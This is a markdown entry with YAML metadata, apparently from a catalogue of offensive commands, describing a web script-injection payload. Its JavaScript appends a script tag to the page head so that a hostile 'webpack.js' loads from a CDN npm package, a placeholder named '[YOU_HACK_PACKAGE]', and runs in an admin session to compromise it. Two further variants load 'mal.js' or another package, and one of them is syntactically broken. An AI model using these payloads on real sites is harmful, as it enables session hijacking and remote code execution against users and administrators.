---
id: cmd-003
data: >-
  <script>document.getElementsByTagName('head')[0].innerHTML +='<script
  type="text/javascript"
  src="https://cdn.jsdelivr.net/npm/[YOU_HACK_PACKAGE]/dist/webpack.js"/>'</script>
tags:
  - script-injection
  - hijack
type: command
output: Injects and executes external script in admin context
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.371Z'
verified: false
validated: true
submitted: true
---
# inject-external-malicious-script

## Command

```javascript
document.getElementsByTagName('head')[0].innerHTML +='<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/[YOU_HACK_PACKAGE]/dist/webpack.js"/>'
```

## Description

Appends an external script tag to the document head, loading a malicious webpack.js from CDN for session compromise.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | URL to external JS | Yes |

## Examples

### Basic Usage

```javascript
document.head.innerHTML += '<script src="https://example.com/mal.js"></script>'
```

### Advanced Usage

```javascript
getElementsByTagName('head')[0].innerHTML += '<script src="https://cdn.jsdelivr.net/npm/pkg/dist/js"></script>'
```

## Expected Output

External script loads and runs in current context, enabling advanced attacks.

## Related

- [[Related Procedure: Inject-External-Script-for-Session-Hijacking]]
